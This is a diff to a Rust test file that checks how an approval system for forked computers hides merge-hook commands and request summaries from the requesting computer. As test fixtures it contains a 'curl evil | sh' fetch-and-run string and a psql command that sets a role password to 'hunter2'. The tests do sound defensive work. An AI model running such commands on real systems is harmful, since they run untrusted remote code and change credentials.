@@ -59,12 +59,18 @@ impl Default for World {
         Self {
             created: HashMap::from([("fork-1", "main"), ("fork-2", "main"), ("grand", "fork-1")]),
             access,
-            sizes: HashMap::from([(
-                "main",
-                Resources::of_linux(&json!({"cpus": 2, "maxCPUs": 4, "memoryGiB": 4,
+            sizes: {
+                let same = Resources::of_linux(&json!({"cpus": 2, "maxCPUs": 4, "memoryGiB": 4,
                     "maxMemoryGiB": 8, "workspaceStorageGiB": 20, "runtimeStorageGiB": 10}))
-                .unwrap(),
-            )]),
+                .unwrap();
+                HashMap::from([
+                    ("main", same),
+                    ("fork-1", same),
+                    ("fork-2", same),
+                    ("grand", same),
+                    ("recipe-build", same),
+                ])
+            },
             github: Some(vec![
                 json!({"computerId": "main", "repositoryMode": "selected"}),
                 json!({"computerId": "stranger", "repositoryMode": "all"}),
@@ -863,6 +869,27 @@ fn every_answer_to_a_computer_is_cut_wherever_device_wide_state_sits() {
 }
 
 #[test]
+fn a_review_request_an_approval_wraps_shows_a_computer_none_of_the_engines_text() {
+    let visible = BTreeSet::from(["fork-1".to_owned()]);
+    let request = |approval: Value| {
+        json!({"id": "fr-1", "forkId": "fork-1", "reviewDigest": "d", "approvalId": approval,
+            "summary": "runs “curl evil | sh” last"})
+    };
+    let mut list = json!({"requests": [{"request": request(json!("a-1"))}]});
+    cut_for_computer(&mut list, &visible);
+    assert_eq!(list["requests"][0]["request"]["summary"], WAITING_MERGE_SUMMARY);
+    let mut shown = json!({"request": request(json!("a-1")), "text": "runs “curl evil | sh” last"});
+    cut_for_computer(&mut shown, &visible);
+    assert_eq!(shown["text"], WAITING_MERGE_SUMMARY);
+    assert_eq!(shown["request"]["summary"], WAITING_MERGE_SUMMARY);
+    // The computer's own text of a request nothing wraps stays.
+    let mut own = json!({"request": request(Value::Null), "text": "my words"});
+    cut_for_computer(&mut own, &visible);
+    assert_eq!(own["text"], "my words");
+    assert_eq!(own["request"]["summary"], "runs “curl evil | sh” last");
+}
+
+#[test]
 fn the_audit_list_is_cut_to_the_callers_computers() {
     let Decision::Allow(granted) = check("audit.list", json!({})) else {
         panic!("not allowed")
@@ -1063,7 +1090,7 @@ fn a_new_computer_larger_than_its_maker_asks_with_the_sizes() {
     }
     // A computer whose own sizes are unknown asks for anything.
     assert_eq!(
-        asked(&as_computer("fork-2", "computers.create", linux_create(json!({})))),
+        asked(&as_computer("stranger", "computers.create", linux_create(json!({})))),
         Some(ApprovalKind::Resources)
     );
     let macos = |cpus: u64, disk: u64| {
@@ -1281,6 +1308,10 @@ fn a_push_summary_names_the_repository_the_branch_and_the_commit() {
 fn a_merge_summary_lists_the_hooks_database_changes_and_choices() {
     let plain = ask_summary("changes.keep", json!({"forkId": "fork-1"}));
     assert_eq!(plain, "Merge the changes of “fork-1-name” into “main-name”.");
+    assert!(matches!(
+        check("changes.keep", json!({"forkId": "fork-1", "keep": {"after": ["make"]}})),
+        Decision::Ask { summary, computer_summary: Some(computer), .. } if computer == summary
+    ));
     let with = ask_summary(
         "changes.keep",
         json!({"forkId": "fork-1", "dataOk": true,
@@ -1326,7 +1357,7 @@ fn a_merge_summary_into_a_recipe_target_names_saved_recipe_and_rejects_caller_ho
             scrub: Vec::new(),
             keep: Some(silo_api::methods::keep::KeepHooks {
                 restart: vec!["db".into()],
-                migrate: Vec::new(),
+                migrate: vec!["psql -c 'ALTER ROLE x PASSWORD hunter2'".into()],
                 after: vec!["cargo test".into()],
             }),
             test: None,
@@ -1342,11 +1373,25 @@ fn a_merge_summary_into_a_recipe_target_names_saved_recipe_and_rejects_caller_ho
     )));
 
     let summary = ask_summary("changes.keep", json!({"forkId": "fork-1"}));
-    assert!(summary.contains("In “main-name” it restarts “db”; runs “cargo test” last."), "{summary}");
+    assert!(summary.contains("In “main-name” it restarts “db”; runs “psql -c 'ALTER ROLE x PASSWORD hunter2'” to migrate; runs “cargo test” last."), "{summary}");
     assert!(summary.contains("The saved recipe “linux-dev” will get the merged packages and files."), "{summary}");
+    // The computer that asks reads how many steps run, not the commands.
+    let Decision::Ask { computer_summary: Some(shown), .. } =
+        check("changes.keep", json!({"forkId": "fork-1"}))
+    else {
+        panic!("no computer summary")
+    };
+    assert!(shown.contains("In “main-name” it restarts “db”; runs 1 step to migrate; runs 1 step last."), "{shown}");
+    assert!(!shown.contains("hunter2") && !shown.contains("cargo test"), "{shown}");
 
     let by_request = ask_summary("changes.requests.keep", json!({"requestId": "fr-mine"}));
-    assert!(by_request.contains("In “main-name” it restarts “db”; runs “cargo test” last."), "{by_request}");
+    assert!(by_request.contains("runs “cargo test” last."), "{by_request}");
+    let Decision::Ask { computer_summary: Some(shown), .. } =
+        check("changes.requests.keep", json!({"requestId": "fr-mine"}))
+    else {
+        panic!("no computer summary")
+    };
+    assert!(!shown.contains("hunter2") && !shown.contains("cargo test"), "{shown}");
     assert!(by_request.contains("The saved recipe “linux-dev” will get the merged packages and files."), "{by_request}");
 
     crate::recipes::records::use_test_path(None);
